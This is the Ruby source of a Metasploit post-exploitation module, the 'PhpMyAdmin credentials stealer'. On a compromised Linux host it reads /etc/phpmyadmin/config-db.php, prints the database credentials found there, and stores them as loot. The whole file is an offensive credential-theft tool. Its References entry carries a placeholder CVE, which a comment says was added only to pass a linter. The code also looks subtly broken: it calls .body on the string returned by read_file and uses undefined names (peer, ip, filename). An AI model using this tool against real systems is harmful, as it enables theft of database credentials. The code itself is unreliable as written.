##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System

  def initialize(info={})
    super(update_info(info,
      'Name'                 => "PhpMyAdmin credentials stealer",
      'Description'          => %q{
        This module gathers PhpMyAdmin Creds from Target Linux machine.
      },
      'License'              => MSF_LICENSE,
      'Platform'             => ['linux'],
      'Privileged'     => 'true', #This requires root privileges
      'SessionTypes'         => ['meterpreter'],
      'Arch'       => 'x86_x64',
      'References'            =>
        [
          [ 'CVE', '0000-0000' ] # This module does not require any CVE this was added to pass msftidy.
        ],
      'Author'               => [
        'bofheaded',
        'Dhiraj Mishra <dhiraj@notsosecure.com>'
        ]
    ))

    register_options(
      [
        OptString.new('SESSION', [ true, 'The session number to run this module on'])
      ])
   end

  def run
    print_line('PhpMyAdmin Creds Stealer')

    if session.platform.include?("windows")
      print_error("This Module is not Compatible with Windows")
      return
    end

    conf_path= "/etc/phpmyadmin/config-db.php"
    unless file_exist?(conf_path)
      vprint_error("#{conf_path} doesn't exist on target")
      return
    end

    print_good('PhpMyAdmin config found!')
    print_good("Extracting config file!\n")
    res = read_file(conf_path)
    print_line res
    vprint_good("#{peer} - #{res.body}")
    path = store_loot(
      'phpmyadmin.credsteal',
      'text/plain',
      ip,
      res.body,
      filename
    )
    print_good("File saved in: #{path}")
  end
end
